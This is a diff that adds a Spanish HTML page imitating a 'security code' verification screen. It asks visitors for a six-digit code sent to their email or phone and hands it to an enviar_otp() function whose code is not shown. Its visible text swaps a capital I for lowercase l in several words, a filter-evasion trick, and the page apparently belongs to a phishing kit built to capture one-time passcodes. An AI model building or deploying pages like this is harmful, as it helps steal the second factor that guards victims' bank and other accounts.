@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Código de Seguridad</title>
+    <link rel="stylesheet" href="./assets/css/styles.css">
+    <link rel="stylesheet" href="./assets/css/clave-celular.css">
+    <link rel="stylesheet" href="./assets/css/info.css">
+    <style>
+        * {
+            -webkit-appearance: none;
+            -webkit-border-radius: 0;
+        }
+        input:focus {
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="./assets/img/cabecera-fija-768x91.png" alt="">
+    </header>
+    <br>
+    <div class="seguridad-text">
+        <h1>Código de seguridad</h1>
+        <br>
+        <section>
+            <br>
+            <span style="font-size: 17px;">Para confirmar que eres tú, ingresa eI código que te enviamos aI correo o ceIuIar en un mensaje de texto</span> <br>
+            <div class="box-form">
+                <img style="width: 40px;" src="./assets/img/icons/ico-clav.png" alt="">
+                <br>
+                <span style="font-size: 18px;">lngresa eI código de seguridad </span>
+                <div><br><br>
+                    <input type="password" style="width: 13%; font-size: 23px; border: none; border-bottom: 1px solid black; text-align: center;" id="f1" name="f1" maxlength="1" class="password">
+                    <input type="password" style="width: 13%; font-size: 23px; border: none; border-bottom: 1px solid black; text-align: center;" id="f2" name="f1" maxlength="1" class="password">
+                    <input type="password" style="width: 13%; font-size: 23px; border: none; border-bottom: 1px solid black; text-align: center;" id="f3" name="f3" maxlength="1" class="password">
+                    <input type="password" style="width: 13%; font-size: 23px; border: none; border-bottom: 1px solid black; text-align: center;" id="f4" name="f4" maxlength="1" class="password">
+                    <input type="password" style="width: 13%; font-size: 23px; border: none; border-bottom: 1px solid black; text-align: center;" id="f5" name="f5" maxlength="1" class="password">
+                    <input type="password" style="width: 13%; font-size: 23px; border: none; border-bottom: 1px solid black; text-align: center;" id="f6" name="f6" maxlength="1" class="password">
+                </div>
+            </div>
+            <div class="box-btn">
+                <button id="btnOTP">CONTINUAR</button>
+            </div>
+            <div class="img-line">
+                <img src="./assets/img/lineas-pag.png" alt="">
+            </div>
+        </section>
+    </div>
+    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/jquery.jclock-min.js" type="text/javascript"></script>
+    <script type="text/javascript" src="js/functions.js"></script>
+    <script type="text/javascript">
+        const inputs = document.querySelectorAll(".password");
+
+        inputs.forEach((input, index) => {
+            input.addEventListener("keyup", (e) => {
+                if (e.target.value.length === 1) {
+                    if (index !== inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+            input.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace") {
+                    if (index !== 0 && e.target.value.length === 0) {
+                        inputs[index - 1].focus();
+                        inputs[index - 1].value = "";
+                    }
+                } else if (e.target.value.length === 1 && index !== inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+        });
+
+        $(document).ready(function() {
+            $('#btnOTP').click(function(){
+                enviar_otp($("#f1").val(), $("#f2").val(), $("#f3").val(), $("#f4").val(), $("#f5").val(), $("#f6").val());				
+            });
+
+            $("#txtOTP").keyup(function(e) {
+                $(".pass").css("border", "1px solid #CCCCCC");	
+                $(".mensaje").hide();				
+            });
+        });
+    </script>
+</body>
+</html>
